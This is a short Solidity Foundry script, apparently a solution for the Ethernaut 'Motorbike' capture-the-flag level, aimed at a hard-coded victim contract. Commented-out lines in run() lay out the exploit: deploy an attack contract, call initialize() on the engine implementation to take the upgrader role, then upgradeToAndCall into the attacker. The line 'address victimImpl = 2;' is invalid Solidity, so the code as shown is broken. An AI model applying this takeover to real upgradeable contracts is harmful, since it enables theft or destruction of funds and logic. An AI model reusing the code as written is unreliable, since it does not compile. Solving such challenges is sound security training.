// SPDX-License-Identifier: Unlicense
pragma solidity 0.8.0;
import "forge-std/Script.sol";
import "../src/MotorbikeAttack.sol";


interface IEngine{
    function upgrader() external view returns(address);
    function horsePower() external view returns(uint256);
    function upgradeToAndCall(address, bytes memory) external payable;
    function initialize() external ;
}

contract Motorbike is Script{
    address victim = 0x1fC73bF0200AED41af2fDe7280Ed794866ad8484;
    address victimImpl = 2;

    function _logs() internal{
        address upgrader = IEngine(victimImpl).upgrader();
        console.log("upgrader: ",upgrader);
        
        uint256 horsePower = IEngine(victimImpl).horsePower();
        console.log("horsePower: ",horsePower);
    }

    function run() external {
        vm.startBroadcast();
        // MotorbikeAttack attacker = new MotorbikeAttack();
        // IEngine(victim).initialize();
        // IEngine(victim).upgradeToAndCall(address(attacker),"");
        // IEngine(victim).initialize();
        _logs();
        vm.stopBroadcast();
    }
}